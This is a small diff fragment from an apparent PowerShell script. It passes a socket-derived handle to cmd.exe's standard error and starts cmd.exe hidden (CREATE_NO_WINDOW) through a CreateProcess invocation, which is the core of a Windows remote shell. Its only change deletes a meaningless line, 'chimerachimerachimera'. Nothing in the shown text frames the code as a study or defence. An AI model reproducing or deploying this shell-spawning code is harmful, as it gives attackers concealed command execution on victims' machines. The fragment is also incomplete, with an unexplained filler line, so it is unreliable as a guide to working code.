@@ -94,5 +94,4 @@ $startupInformation.hStdError = $safeHandle
 $cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\cmd.exe")
 $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $true, 0x08000000, [IntPtr]::Zero, $null, $startupInformation, $processInformation))
 
-chimerachimerachimera
 $CloseSocket.Invoke($hSock)
